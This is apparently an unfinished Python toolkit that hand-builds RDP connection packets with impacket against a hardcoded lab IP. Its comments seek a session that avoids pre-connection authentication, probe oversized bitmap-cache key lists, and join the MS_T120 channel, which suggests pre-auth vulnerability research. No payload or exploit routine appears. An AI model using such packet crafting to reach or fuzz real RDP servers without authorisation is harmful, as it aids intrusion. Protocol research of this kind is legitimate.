import binascii
import base64
import logging
import socket
import struct
import sys
import time

from impacket.structure import Structure
from impacket.spnego import GSSAPI, ASN1_SEQUENCE, ASN1_OCTET_STRING, asn1decode, asn1encode

from OpenSSL import SSL

FORMAT = "%(levelname)s - %(message)s"
logging.basicConfig(level=logging.DEBUG, format=FORMAT)

HOST = "192.168.187.185"
PORT = 3389

TPDU_CONNECTION_REQUEST  = 0xe0
TPDU_CONNECTION_CONFIRM  = 0xd0
TPDU_DATA                = 0xf0
TPDU_REJECT              = 0x50
TPDU_DATA_ACK            = 0x60

# RDP_NEG_REQ constants
TYPE_RDP_NEG_REQ = 1
PROTOCOL_RDP     = 0
PROTOCOL_SSL     = 1
PROTOCOL_HYBRID  = 2

# RDP_NEG_RSP constants
TYPE_RDP_NEG_RSP = 2
EXTENDED_CLIENT_DATA_SUPPORTED = 1
DYNVC_GFX_PROTOCOL_SUPPORTED   = 2

# RDP_NEG_FAILURE constants
TYPE_RDP_NEG_FAILURE                  = 3
SSL_REQUIRED_BY_SERVER                = 1
SSL_NOT_ALLOWED_BY_SERVER             = 2
SSL_CERT_NOT_ON_SERVER                = 3
INCONSISTENT_FLAGS                    = 4
HYBRID_REQUIRED_BY_SERVER             = 5
SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER = 6

##################################################
# Some helper functions 

def pack(packet):
    """
    pack packet into hex
    """
    return binascii.hexlify(packet)

def unpack(packet):
    """
    unpack packet into hex
    """
    return binascii.unhexlify(packet)

def recv_all(s):
    """
    http://code.activestate.com/recipes/408859-socketrecv-three-ways-to-turn-it-into-recvall/
    """
    total_data=[]
    while True:
        print("peeking")
        data = s.recv(8192,socket.MSG_PEEK|socket.MSG_DONTWAIT)
        print(data)
        if not data: break
        print("receiving")
        data = s.recv(8192)
        total_data.append(data)
    return ''.join(total_data) 
##################################################
# RDP Encryption
# Let's not use this unless we have to. 
# Using TLS instead appears to be a better option

class RdpEncrypt():
    def __init__(self):
        self.modulus = 0
        self.exp = 0
        self.keylen = 0

    def reverseByteArray(self, byteArray):
        reversedArray = ""
        i = len(byteArray) - 1
        while(i > 0):
            reversedArray += (byteArray[i-1] + byteArray[i])
            i-=2 

        return reversedArray

    def rsaEncrypt(self, data):
        data    = self.reverseByteArray(data)
        modulus = self.reverseByteArray(self.modulus)
        exp     = self.reverseByteArray(self.exp)

        modBigInt = int.from_bytes(unpack(modulus), byteorder='big', signed=False)
        exponentBigInt = int.from_bytes(unpack(exp), byteorder='big', signed=False)
        dataBigInt = int.from_bytes(unpack(data), byteorder='big', signed=False)

        cipher = pow(dataBigInt, exponentBigInt, modBigInt)
        cipher = (cipher).to_bytes(self.keylen-8, byteorder="big", signed=False)
        cipher = self.reverseByteArray(cipher.hex())
        return cipher

    def parseServerCert(self, certbytes):
        print("SERVER CERT: ")

        hdr = certbytes[:30]
        certLen = int.from_bytes(unpack(hdr[26:]),byteorder="little", signed=False)
        certbytes = certbytes[30:]

        cert = certbytes[:certLen*2]
        magic = certbytes[:8]
        self.keylen = struct.unpack('<I',unpack(certbytes[8:16]))[0] 
        self.exp = certbytes[32:40]
        self.modulus = certbytes[40:40-16+self.keylen*2] # remove trailing 0s

##################################################
# Lower layers used to encapsulate RDP PDUs

class TPKT(Structure):
    commonHdr = (
        ('Version','B=3'),
        ('Reserved','B=0'),
        ('Length','>H=len(TPDU)+4'),
        ('_TPDU','_-TPDU','self["Length"]-4'),
        ('TPDU',':=""'),
        ('PADDING', ':=""'),
    )
    def __init__(self, data = None):
        logging.debug("TPKT")
        Structure.__init__(self,data)
        self['PADDING'] = b''



class CR_TPDU(Structure):
    # len should normally be 29 in the ClientRequest
    commonHdr = (
        ('DST-REF','<H=0'),
        ('SRC-REF','<H=0'),
        ('CLASS-OPTION','B=0'),
        ('token',':=""'),
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)

class NEG_TPDU(CR_TPDU):

    structure = (
        ('idk','>H=0x0d0a'),
        ('type','B=0'),
        ('flags','B=0'),
        ('length','<H=8'),
        ('requestedProtocols', '<L=0')
    )

    def __init__(self,data=None):
        CR_TPDU.__init__(self,data)
        self['type'] = 1

class DATA_TPDU(Structure):
    # type 0x0F: DT Data
    # class option 0x80: last data unit

    commonHdr = (
        ('class_option','B=0x80'),
    )

class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator','B=len(TPDU_Payload)+1'),
        ('Code','B=0'),
        ('TPDU_Payload',':=""'),
        ('T125',':=""'),
    )

    def __init__(self, data = None):
        logging.debug("TPDU")
        Structure.__init__(self,data)
        self['TPDU-Payload'] = ''
        self['UserData'] = ''

    def connectionRequest(self):
        logging.debug("CR-TPDU")
        cr = CR_TPDU()
        cr['token'] = 'Cookie: mst shash=lol'

        self['Code'] = TPDU_CONNECTION_REQUEST
        self['TPDU_Payload'] = cr.getData()
    
    def negRequest(self):
        ''' MAKE SURE REQUESTEDPROTOCOLS IS 0X1 (TLS), don't add protocol hybrid or anything, this forces
        the server to want CredSSP enabled -- i.e. after TLS is set up the server expects NTLM or some other
        form of auth before initializing the RDP connection. Went want to initialize THEN auth in. 
        '''

        logging.debug("NEG-TPDU")
        nr = NEG_TPDU()
        nr['requestedProtocols'] = 0x1
        nr['token'] = 'Cookie: mst shash=vxer'
        self['Code'] = TPDU_CONNECTION_REQUEST
        self['TPDU_Payload'] = nr.getData()

    def dataRequest(self,data):
        logging.debug("DATA-TPDU")
        dr = DATA_TPDU()

        self['Code'] = TPDU_DATA
        self['TPDU_Payload'] = dr.getData()
        self['T125'] = data.getData()

class T125DataRequest(Structure):
    """
    MSB of dataLen is 0x8000 if dataLen > 255, let's just keep it that way and see if it works.
    ORing the size field with 0x8000 seems to satisfy these conditions. 

    The client initialization request will need similar functionality later on.
    """
    logging.debug("T125DataRequest")
    commonHdr = (
        ('initiator','>H=7'),
        ('channelId','>H=0'),
        ('dataPriority','B=0x70'),
        #('dataLen','>H=len(userData)|0x8000'),  
        #('dataLen','>H=len(userData)'),  
        ('dataLen',':=""'),
        ('userData', ':=""'),
    )

    def __init__(self, data = None):
        Structure.__init__(self,data)

    def setChannel(self,channel):
       self['channelId'] = channel 

    def setData(self,data):

        self['userData'] = data
        dlen = len(self['userData'])
        res = b""
        if dlen > 255:
            res = struct.pack('>H', dlen|0x8000)
        else: 
            #res = struct.pack('>B',dlen)
            res = struct.pack('>H', dlen|0x8000) # MODIFIED THIS: 11/18/2019 to see if size <255 doesn't break
                                                 # get rid of the OR and make H -> B
        self['dataLen'] =  res

##################################################

class ClientInfoPDU(Structure):
    commonHdr = (
        ('flags', '<H=0x0040'),
        ('flagsHigh', '<H=0x48c0'),
        ('codePage','<L=0x09040904'),
        ('optionsFlags','<L=0x000347bb'),
        ('cbDomain','<H=0'),       
        ('cbUserName','<H=0'),           # might need to match length of user name
        ('cbPassword','<H=0'),           # might need to match length of password 
        ('cbAlternateShell','<H=0'),
        ('cbWorkingDomain','<H=0'),
        ('domain','<H=0'),
        ('username','<H=0'),
        ('password','<H=0'),
        ('alternateShell','<H=0'),
        ('workingDir','<H=0'),
        ('clientAddressFamily','<H=2'),
        ('cbClientAddress','<H=len(clientAddress)'),
        ('clientAddress',':=""'),
        ('cbClientDir','<H=len(clientDir)'),
        ('clientDir',':=""'),
        ('clientTimezone',':=""'),
        ('clientSessionId','<L=1'),
        ('performanceFlags','<L=6'),
        ('cbAutoReconnection','<H=0'),
        ('reserved1','<H=0x64'),
        ('reserved2','<H=0')
    )

    def __init__(self, data=None):
        Structure.__init__(self,data)
        self['clientAddress'] = unpack("3100390032002e003100360038002e003100380037002e003200340032000000")
        self['clientDir'] = unpack("43003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000")
        self['clientTimezone'] = unpack("e0010000500061006300690066006900630020005300740061006e0064006100720064002000540069006d0065000000000000000000000000000000000000000000000000000b0000000100020000000000000000000000500061006300690066006900630020004400610079006c0069006700680074002000540069006d0065000000000000000000000000000000000000000000000000000300000002000200000000000000c4ffffff")

class ConfirmActivePDU(Structure):
    '''
    TODO: break up capabilities into their actual data types
    Right now it's a huge steaming blob of hex that needs to be defined.
    '''
    commonHdr = (
        ('shareId','<L=0x000103ea'),
        ('originatorId','<H=1002'),
        ('lengthSourceDescriptor','<H=6'),
        ('lengthCombinedCapabilities','<H=479'),
        ('sourceDescriptor',':=""'),
        ('numberCapabilities','<H=22'),
        ('pad2octets','<H=0'),
        ('capabilities',':=""')
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self['sourceDescriptor'] = unpack("4d5354534300") # MSTSC\x00
        self['capabilities'] = unpack("01001800010003000002000000001d04000000000000000002001c002000010001000100400b0807000001000100001a0100000003005800000000000000000000000000000000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800910020000904000007000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c00010000000000000015000c0002000000000a00011a0008002b4809001c000c0012000000000000001b00060001001e0008000100000018000b0002000000030c00")

class SynchronizePDU(Structure):
    commonHdr = (
        ('shareId','<L=0x000103ea'),
        ('pad1','B=0'),
        ('streamId','B=1'),
        ('uncompressedLength','<H=8'),
        ('pduType','B=0x1f'),
        ('compressedType','B=0'),
        ('compressedLength','<H=0'),
        ('messageType','<H=1'),
        ('targetUser','<H=1002')
    )

class CooperatePDU(Structure):
    commonHdr = (
        ('shareId','<L=0x000103ea'),
        ('pad1','B=0'),
        ('streamId','B=1'),
        ('uncompressedLength','<H=12'),
        ('pduType','B=20'),
        ('compressedType','B=0'),
        ('compressedLength','<H=0'),
        ('action','<H=0x4'),
        ('grantId','<H=0'),
        ('controlId','<L=0')
    )

class ControlPDU(CooperatePDU):
    def __init__(self,data=None):
        CooperatePDU.__init__(self,data)
        self['action'] = 1 # Request Control action

class KeyListPDU(Structure):
    """
    This class appears to be important because we can send an arbitrary number of total cache entries. Cache entries are 
    ordered by [LOWER32_BITS][HIGHER32_BITS] and are in sequential order with which cache numer they deal with. 

    The number of keys per PDU "should" be limited to 169, any more "should" be sent through another PDU request. 

    There are a lot of "shoulds" written in the specs, and since we get the ability to write nearly arbitrary numbers
    of keys as arbitrary data, this is an interesting one to test more. 

    TODO: add more logic that automatically determines the number of PDUs to send based off the number of PDUs we send over. 
    This functionality could probably be added through a helper function or something. 

    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/a6218d19-5505-445d-acea-1b3f5b0097dc
    """
    commonHdr = (
        ('shareId','<L=0x000103ea'),
        ('pad1','B=0'),
        ('streamId','B=1'),
        ('uncompressedLength','<H=12'),
        ('pduType','B=43'), # BitmapCache Persistent List
        ('compressedType','B=0'),
        ('compressedLength','<H=0'),
        ('numEntriesCache0','<H=0'),
        ('numEntriesCache1','<H=0'),
        ('numEntriesCache2','<H=0'),
        ('numEntriesCache3','<H=0'),
        ('numEntriesCache4','<H=0'),
        ('totalEntriesCache0','<H=0'),
        ('totalEntriesCache1','<H=0'),
        ('totalEntriesCache2','<H=0'),
        ('totalEntriesCache3','<H=0'),
        ('totalEntriesCache4','<H=0'),
        ('bitMask','B=1'),
        ('pad2','B=0'),
        ('pad3','<H=0'),
        ('entries',':=""')
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self.cache2Count = 0

        self['entries'] = b''
        self['numEntriesCache2'] = 0
        self['totalEntriesCache2'] = 0

    def addEntry(self,entry):
        """ Adds an arbitrary entry to entries. Entries should be 64-bits of data, e.g: "\xff\xff\xff\xff\xff\xff\xff\xff"
        Keeps track of the entry count with cache2Count, this is incremended each time and updates our structure. 
        
        So far the only examples I see work with Cache2, so we're only messing with that for now. 
        """
        self.cache2Count += 1
        self['numEntriesCache2'] = self.cache2Count
        self['totalEntriesCache2'] = self.cache2Count
        self['entries'] += entry

class FontListPDU(Structure):
    commonHdr = (
        ('shareId','<L=0x000103ea'),
        ('pad1','B=0'),
        ('streamId','B=1'),
        ('uncompressedLength','<H=0'),
        ('pduType','B=39'), # Fontlist
        ('compressedType','B=0'),
        ('compressedLength','<H=0'),
        ('numberEntries','<H=0'),
        ('totalNumEntries','<H=0'),
        ('listFlags','<H=0x3'),
        ('entrySize','<H=50')
    )

class ClientPDU(Structure):

    commonHdr = (
        ('totalLength','<H=len(PDU)+6'),
        ('PDUtype','<H=0'),
        ('PDUsource', '<H=1008'),
        ('PDU', ':=""')
    )
    def __init__(self, data=None):
        logging.debug("ClientPDU")
        self.PDUTYPE_VERSION_LOW         = 0x10
        self.PDUTYPE_CONFIRM_ACTIVE_PDU  = 0x03
        self.PDUTYPE_DATA_PDU            = 0x07
        self.PDUTYPE_TS_PROTOCOL_VERSION = 0x10

        Structure.__init__(self,data)

    def setPDU(self,data):
        self['PDU'] = data

    def confirmActivePDU(self):
        pdu = ConfirmActivePDU()
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_CONFIRM_ACTIVE_PDU
        self.setPDU(pdu.getData())
    
    def synchronizePDU(self):
        pdu = SynchronizePDU()
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_DATA_PDU
        self.setPDU(pdu.getData())

    def cooperatePDU(self):
        pdu = CooperatePDU()
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_DATA_PDU
        self.setPDU(pdu.getData())

    def controlPDU(self):
        pdu = ControlPDU()
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_DATA_PDU
        self.setPDU(pdu.getData())

    def keylistPDU(self):
        pdu = KeyListPDU()
        pdu.addEntry(b"\xff"*8)
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_DATA_PDU
        self.setPDU(pdu.getData())

    def fontListPDU(self):
        pdu = FontListPDU()
        self['PDUtype'] = self.PDUTYPE_VERSION_LOW | self.PDUTYPE_DATA_PDU
        self.setPDU(pdu.getData())

class VirtualChannelPDU(Structure):
    commonHdr = (
        ('length','<L=len(PDU)'),
        ('flags','<L=0'),
        ('PDU',':=""'),
    )

    def __init__(self,data=None):
        logging.debug("VirtualChannelPDU")
        self.CHANNEL_FLAG_FIRST = 0x2
        self.CHANNEL_FLAG_LAST  = 0x3
        Structure.__init__(self,data)

        self['flags'] = self.CHANNEL_FLAG_FIRST|self.CHANNEL_FLAG_LAST
        self['PDU'] = b''

    def setPDU(self,data):
        self['PDU'] = data

class SecurityExchangePDU(Structure):
    commonHdr = (
        ('header','B=0x01'),
        ('flags','<H=0x0001'),
        ('flagsHigh', '<H=0x0000'),
        ('length','<L=len(securityPacket)+8'),
        ('securityPacket',':=""'),
        ('padding','L=0')
    )
    # Length of this doesn't appear to count towards TPKT length
    # Might re-add it here later if it doesn't solve our ClientRandom exchange issue
    #('padding','L=0')
    def __init__(self, data = None):
        Structure.__init__(self,data)
        self['securityPacket'] = b''
        #self['securityPacket' ] = unpack("b122858e15b5e1523a3f4e08e91c8d57226350e6eefc04b863a4753c02776f2e087a34af9dea6a20771389a5114f540083d9ea939844f60b50609c276b810d0cf4b0c8dcf1156a59e3c8e5737574ca24e5ef4911917753efd5941150e774573702af2ac2c7024f5d192f12ff7ad36da77cf1235a321b9a44d18be077dbacd8ae51b16343f29289f59f80e068576edc3f9be3bec4b1a076d2ac64321a5d735d0025f2ea0ec1d443626fb93ee0d5cae0fe4f9dfa11bf679af7d971838ea0f82f79fabd3c4833d13b46079347d4a2f9a14e7c8749b96003e0902e9a186606e0bb2b5ed4acd4ed67e07f1fc169b6ab037719ac73b1cba0d0634e933a6e8c3070c2bd0000000000000000")

    def setSecurityPacket(self, packet):
        print("setSecurityPacket")
        self['securityPacket'] = unpack(packet)


class T125(Structure):
    """
    Only calling this T125 because wireshark says so
    """

    commonHdr = (
        ('choice','<B=0'),
        ('data',':=""'),
    )

    def __init__(self, data = None):
        logging.debug("T125")
        self.ERECT_DOMAIN_REQUEST = 0x04
        self.ATTACH_USER_REQUEST  = 0x28
        self.CHANNEL_JOIN_REQUEST = 0x38
        self.SEND_DATA_REQUEST    = 0x64
        Structure.__init__(self,data)

    def erectDomainRequest(self):
        self['choice'] = self.ERECT_DOMAIN_REQUEST
        self['data'] = b"\x00\x01\x00\x01" # subHeight and subInterval

    def attachUserRequest(self):
        self['choice'] = self.ATTACH_USER_REQUEST
        # no data for this one idk why but MSFT says so

    def channelJoinRequest(self, channel):
        self['choice'] = self.CHANNEL_JOIN_REQUEST
        self['data'] = b"\x00\x07" + struct.pack(">H",channel) # initiator + channelId

    def sendDataRequest(self, data):
        self['choice'] = self.SEND_DATA_REQUEST
        self['data'] = data

class T125ConnectInitial(Structure):
    """
    Only calling this T125 because wireshark says so. Could rename this or build it in with other T125 later somehow? 
    """
    structure = (
            ('t125header', ':=""'),
            ('BERType','>H=0x7f65'), # remove these, add back t125Header if it breaks 
            ('typeLength',':=""'), #
            #('delim1', '>H=0x0401'),
            #('callingDomainSelector', 'B=0x01'),
            ('callingDomainSelector',':=""'),
            #('delim2', '>H=0x0401'),
            #('calledDomainSelector', 'B=0x01'),
            ('calledDomainSelector', ':=""'),
            ('BERupward', '>H=0x0101'),
            ('upwardFlag', 'B=0xFF'),
            ('targetParameters', ':=""' ),
            ('minimumParameters', ':=""' ),
            ('maximumParameters', ':=""' ),
            ('asnOctetString','B=0x04'), #
            #('userDataLen','>L=0x04820161'),
            ('userDataLen',':=""'),
            ('userData',':=""'),
    )       

    def __init__(self,data=None):
        '''
        TODO: breakdown hex streams into more granularity
        User wireshark for guidance 
        '''

        Structure.__init__(self,data)
        #self['t125header'] = "\x7f\x65\x82\x01\xc2"
        self['typeLength'] = b""
        self['callingDomainSelector'] = unpack("040101")
        self['calledDomainSelector'] = unpack("040101")
        self['targetParameters'] = unpack("30190201220201020201000201010201000201010202ffff020102")
        self['minimumParameters'] = unpack("301902010102010102010102010102010002010102020420020102")
        self['maximumParameters'] = unpack("301c0202ffff0202fc170202ffff0201010201000201010202ffff020102")
        self['userData'] = b""

    def addUserData(self,data):
        self['userData'] = data
        # calculate userDataLen; we figure out if we add the \x82 MSB required *shrugs* 
        l = len(data)
        res = b''
        if l > 255:
            res = b'\x82' + struct.pack('>H',l)
        else:
            res = struct.pack('>B',l)
        self['userDataLen'] = res

        # calculate BERtypeLength, we figure out if it's greater than 255 and figure out if it needs BER padding
        # there HAS to be a better way to add up all these byte lengths with impacket
        l = len(self['callingDomainSelector']) + len(self['calledDomainSelector']) + \
            len(self['targetParameters']) + len(self['minimumParameters']) + \
            len(self['maximumParameters']) + len(self['userDataLen']) + \
            len(self['userData']) + 4 # 4 comes from static byte values also in structure
        res = b'' 
        if l > 255:
            res = b'\x82' + struct.pack('>H',l)
        else:
            res = struct.pack('>B',l)
        self['typeLength'] = res

class T124(Structure):
    ''' If we change the T124 userDataItems too much we might break the packet and cause "malformed packet errors"
    in wireshark and stuff; it gets really annoying to debug. 

    TODO: t124IdDelim and the 2nd "unpack" in addRdpItem need to be figured out. Values after the "81" byte appear to 
    be dynamic and based off of size of the X224 payload. 
    '''
    commonHdr = (
            ('Choice','>B=0'), 
            ('objLen','>B=5'), 
            ('object',':=""'),
            ('userDataLen',':=""'),
            ('extensionBit','B=0'),
            ('conferenceName', '>H=0x0800'),
            ('conferenceFlags', 'B=0x10'),
            ('termMethod','B=0'),
            ('numUserDataSets','B=0x01'),
            ('valuePresent', 'B=0xc0'),
            ('h221NonStdLen', 'B=0'),
            ('h221Key',':=""'),
            ('userDataValLen',':=""'),
            ('userData',':=""'),
    )
    def __init__(self,data=None):
        logging.debug("T124")
        Structure.__init__(self,data)
        if data is None:
            self['object'] = unpack("00147c0001")
            self['userData'] = b""
            self['userDataLen'] = b""
            self['userDataValLen'] = b""
            self['h221Key'] = "Duca"

    def addUserData(self,value):
        item = value
        self['userData'] += item

        # calculates length of userdata and prepends 0x8000 MSB if len > 255 (PER encoding?)
        res = b''
        l = len(self['userData'])
        if l > 255:
            res = struct.pack('>H',l|0x8000)
        else:
            res = struct.pack('B',l)

        self['userDataValLen'] = res

        # calculates length of userData + header stuff and prepends 0x8000 MSB if len > 255 (PER encoding?)
        res = b''
        l += 8 + len(self['h221Key']) + len(self['userDataValLen'])
        if l > 255:
            res = struct.pack('>H',l|0x8000)
        else: 
            res = struct.pack('B',l)

        self['userDataLen'] = res

class RDPClientCoreData(Structure):
    ''' ServerSelectedProtocol is important here, it has to match the negotiated protocols (0x1 = SSL, 0x3 = Hyrbid, etc)
    We want to make sure the server doesn't expect CredSSP, otherwise we're stuck sending NTLM over before initializing.
    '''
    commonHdr = (
        ('versionMajor','<H=12'),
        ('versionMinor','<H=8'),
        ('desktopWidth','<H=2880'),
        ('desktopHeight','<H=1800'),
        ('colorDepth','<H=0xca01'),
        ('SASSequence','<H=43523'),
        ('keyboardLayout', '<L=1033'),
        ('clientBuild','<L=18362'),
        ('clientName',':=""'),
        ('keyboardtype','<L=7'),
        ('keyboardSubType','<L=0'),
        ('keyboardFunctionKey','<L=12'),
        ('imageFileName',':=""'),
        ('postBeta2ColorDepth','<H=0xca01'),
        ('clientProductId', '<H=1'),
        ('serialNumber','<L=0'),
        ('highColorDepth','<H=0x0018'),
        ('supportedColorDepths','<H=0xf'),
        ('earlyCapabilityFlags','<H=1967'),
        ('clientDigProductId',':=""'),
        ('connectionType','B=7'),
        ('pad1octet','B=0'),
        ('serverSelectedProtocol','<L=1'),
        ('wat_is_this',':=""')
    )

    def __init__(self,data=None):
        logging.debug("RDPCore")
        Structure.__init__(self,data)
        if data is None:
            self['clientName'] = unpack("4400450053004b0054004f0050002d0039004d003200340052004f0050000000")
            self['imageFileName'] = unpack("00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
            self['clientProductId'] = unpack("00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
            self['clientDigProductId'] = unpack("360039003800330035003700350037002d0032003500330035002d0034006600380065002d0061003600370065002d0036003400310031006600630032000000")
            self['wat_is_this'] = unpack("fa020000dc0100000000c8000000b4000000")

class RDPClientClusterData(Structure):
    commonHdr = (
       ('clusterFlags','<L=0x15'),
       ('redirectedSessionId','<L=0'),
    )
    def __init__(self,data=None):
        Structure.__init__(self,data)

class RDPClientSecurityData(Structure):
        # original encryption method
        # we're setting it to 0 for now
        #('encryptionMethods','>L=0x03000000'),
    commonHdr = (
        ('encryptionMethods','>L=0x1b000000'),
        ('extEncryptionMethods','>L=0'),
    )
    def __init__(self,data=None):
       Structure.__init__(self,data)

class RDPChannelDef(Structure):
    commonHdr = (
            ('channelName',':=""'),
        ('channelOptions','<L=0'),
    )
    def __init__(self,data=None):
        Structure.__init__(self,data)
       
class RDPClientNetworkData(Structure):
    
    commonHdr = (
        ('channelCount','<L=""'),
        ('channelDefArray', ':=""'),
    )
    def __init__(self,data=None):
        self.channelCount = 0
        Structure.__init__(self,data)
        self['channelCount'] = 0
        self['channelDefArray'] = b""

    def addChannel(self, channelName, channelOptions):
        channel = RDPChannelDef()

        # channel names appear to get padded to 8 bytes with 0s
        # names longer than 8 just get a single null byte appended
        length = len(channelName)
        if length < 8:
            diff = 8 - length
            channelName += "\x00" * diff
        else:
            channelName += "\x00"

        channel['channelName'] = channelName
        channel['channelOptions'] = channelOptions

        self.channelCount += 1
        self['channelCount'] = self.channelCount
        self['channelDefArray'] += channel.getData()

class RDPClientMsgChannelData(Structure):
    commonHdr = (
        ('msgChannelFlags','<L=0'),
    )

class RDPClientMultiTransportData(Structure):
    commonHdr = (
        ('multiTransportFlags','<L=0x00000305'),
    )

class RDPClientData(Structure):

    commonHdr = (
            ('headerType', '<H=0'),
            ('headerLength', '<H=len(clientData)+4'),
            ('clientData',':=""'),
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self.CLIENT_CORE_DATA            = 0xc001
        self.CLIENT_SECURITY_DATA        = 0xc002
        self.CLIENT_NETWORK_DATA         = 0xc003
        self.CLIENT_CLUSTER_DATA         = 0xc004
        self.CLIENT_MSG_CHANNEL_DATA     = 0xc006
        self.CLIENT_MULTI_TRANSPORT_DATA = 0xc00a
        self['clientData'] = b""

    def createCoreData(self):
        coreData = RDPClientCoreData()

        self['headerType'] = self.CLIENT_CORE_DATA
        self['clientData'] = coreData.getData()

    def createClusterData(self):
        clusterData = RDPClientClusterData()

        self['headerType'] = self.CLIENT_CLUSTER_DATA
        self['clientData'] = clusterData.getData()

    def createSecurityData(self):
        securityData = RDPClientSecurityData()

        self['headerType'] = self.CLIENT_SECURITY_DATA
        self['clientData'] = securityData.getData()

    def createNetworkData(self):
        networkData = RDPClientNetworkData()
        networkData.addChannel('rdpdr'  ,0x00008080)
        networkData.addChannel('rdpsnd' ,0xc0000000)
        networkData.addChannel('cliprdr',0xc0a00000)
        #networkData.addChannel('drdynvc',0xc0800000)
        networkData.addChannel('MS_T120',0x00000000)

        self['headerType'] = self.CLIENT_NETWORK_DATA
        self['clientData'] = networkData.getData()

    def createClientMsgChannelData(self):
        msgChannelData = RDPClientMsgChannelData()

        self['headerType'] = self.CLIENT_MSG_CHANNEL_DATA
        self['clientData'] = msgChannelData.getData()

    def createClientMultiTransportData(self):
        multiTransportData = RDPClientMultiTransportData()

        self['headerType'] = self.CLIENT_MULTI_TRANSPORT_DATA
        self['clientData'] = multiTransportData.getData()
     
class RDP(Structure):
    """
    TODO: re-work this one a bit
    """
    commonHdr = (
            ('clientData',':=""'),)

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self['clientData'] = b""
        #if data is None:
        #    self['clientData'] = unpack("01c0d800040008002003580201ca03aa09040000280a0000630066002d006b0061006c00690000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c0380004000000636c697072647200c0a00000726470736e640000c0000000736e646462670000c0000000726470647200000080800000")

    def addClientData(self, data):
        self['clientData'] += data

class ChannelPDU(Structure):
    """
    """
    commonHdr = (
            ('Len','<L=len(data)'),
            ('Flags','<L=0x3'),
            ('data',':=""')
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self['data'] = b''

    def setData(self,data):
        self['data'] = data

class ShutdownRequestPDU(Structure):
    commonHdr = (
        ('totalLength','<H=0x12'),
        ('pduType','<H=0x17'),
        ('pduSource','<H=1007'),
        ('shareId','<L=0x000203ea'),
        ('pad1','<B=0'),
        ('streamId','<B=1'),
        ('uncompressedLength','<H=4'),
        ('pduType2','<B=0x24'),
        ('generalCompressedType','<B=0'),
        ('generalCompressedLength','<H=0'),
    )

##################################################
# RDP FastPath Input Data

class FPInputPDU(Structure):
    """
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/d8f1be0e-ca81-4caf-a494-3c161d21a7f2
    """
    commonHdr = (
        ('fpInputHdr','B=0'),
        ('length1','B=len(fpInputEvents)+2'), # +2 because it appears to include fpInputHdr len and its own len
        ('fpInputEvents',':=""')              # arbitrary size, so we'll make a method that adds arbitrary input events
    )

    def __init__(self,data=None):
        logging.debug("FastPath Input PDU")
        Structure.__init__(self,data)
        self['fpInputHdr'] = 0x04 # this value has a lot encoded in it
                                  # 0xc4 = 11 0001 00
                                  # 00 = action FASTPATH_INPUT_ACTION_FASTPATH -- shouldn't change
                                  # 0001 = number of events (1) -- TODO: we can build a flag or something to OR to increment this
                                  # 11 - FASTPATH_INPUT_SECURE_CHECKSUM | FASTPATH_INPUT_ENCRYPTED -- if it works don't change it
        self['fpInputEvents'] = b''

        # increment this value, shift left by 2?, then OR it with fpInputHdr to increment number of events in header
        # TODO: implement this later
        self.numEvents = 0

    def addInputEvent(self,inputEvent):
        self['fpInputEvents'] = inputEvent

    def addKeyBoardEvent(self,keyCode):
        kb_event = FPKeyBoardEvent(keyCode)
        self.addInputEvent(kb_event.getData())
    
    def addMouseEvent(self,xpos,ypos):
        m_event = FPMouseEvent(xpos,ypos)
        self.addInputEvent(m_event)

class FPKeyBoardEvent(Structure):
    """
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/089d362b-31eb-4a1a-b6fa-92fe61bb5dbf
    """
    commonHdr = (
        ('eventHeader','B=0x01'),
        ('keyCode','B=0')
    )
    def __init__(self,keyCode,data=None):
        logging.debug("FP KeyBoardEvent\n\tKeyCode: {}".format(keyCode))
        Structure.__init__(self,data) 
        self['keyCode'] = keyCode

class FPMouseEvent(Structure):
    """
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/d8f1be0e-ca81-4caf-a494-3c161d21a7f2
    """
    commonHdr = (
        ('eventHeader','B=0x20'), # eventFlags = 0, eventCode = 1 (FASTPATH_INPUT_MOUSE_EVENT)
        ('pointerFlags','<H=0x0800'), # PTRFLAGS_MOVE
        ('xPos','<H=0'),
        ('yPos','<H=0')
    )

    def __init__(self,xpos,ypos,data=None):
        logging.debug("FP MouseEvent\n\txPos: {}\n\tyPos: {}".format(xpos,ypos))
        Structure.__init__(self,data)
        self['xPos'] = xpos
        self['yPos'] = ypos

##################################################
# RDP-DYVC

class DVCBase(Structure):
    commonHdr = (
        ('hdrBitmask','B=0x58'),
    )

    def __init__(self,data=None):
        Structure.__init__(self,data)
        self.DYNVC_CMD_CAPABILITIES = 0x50
        self.DYNVC_SP               = 0x08
